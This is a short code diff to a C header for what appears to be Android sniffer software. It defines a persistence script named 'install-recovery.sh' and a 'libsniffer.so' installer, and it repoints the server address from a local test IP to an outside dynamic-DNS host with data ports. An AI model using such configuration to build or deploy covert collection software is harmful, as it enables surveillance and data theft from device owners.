@@ -29,8 +29,8 @@
 #define AutoStartScriptFile				"install-recovery.sh"
 #define SnifferInStallerFile			"libsniffer.so"
 
-//#define ServerAdess						"drsniffer.wicp.net"
-#define ServerAdess						"192.168.30.150"
+#define ServerAdess						"drsniffer.wicp.net"
+//#define ServerAdess						"192.168.30.150"
 #define ServerPort						 9873
 #define HttpServerPort					 9875
 #define SnifferLogFileName				"sniffer"
